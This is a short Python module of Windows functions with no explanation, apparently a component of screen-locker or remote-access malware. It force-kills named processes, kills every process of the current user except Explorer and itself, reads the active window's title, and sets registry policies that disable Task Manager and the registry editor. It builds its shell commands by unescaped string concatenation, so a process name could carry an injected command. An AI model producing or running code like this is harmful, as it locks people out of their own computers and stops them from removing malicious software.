# Import modules

from subprocess import Popen
from ctypes import windll, create_unicode_buffer


# Ends the selected process

def KillProcess(Process):
 if not Process.endswith('.exe'):
     Process = Process + '.exe'
 Popen('taskkill /f /im ' + Process, shell=True)


# Gets the title of the active window

def WindowTitle():
 hWnd = windll.user32.GetForegroundWindow()
 length = windll.user32.GetWindowTextLengthW(hWnd)
 buf = create_unicode_buffer(length + 1)
 windll.user32.GetWindowTextW(hWnd, buf, length + 1)
 if buf.value:
  return buf.value


# Stops all processes

def TaskkillAll(CurrentName):
 Popen('taskkill /f /fi "USERNAME eq %username%" /fi "IMAGENAME ne explorer.exe USERNAME eq %username%" /fi "IMAGENAME ne "' + CurrentName + '"',
  shell=True)
 Popen('explorer.exe',
  shell=True)


# Disabling Task Manager and Regedit

def RegeditDisableTaskManager():
 Popen('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f',
  shell=True)

def RegeditDisableRegistryTools():
 Popen('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f',
  shell=True)
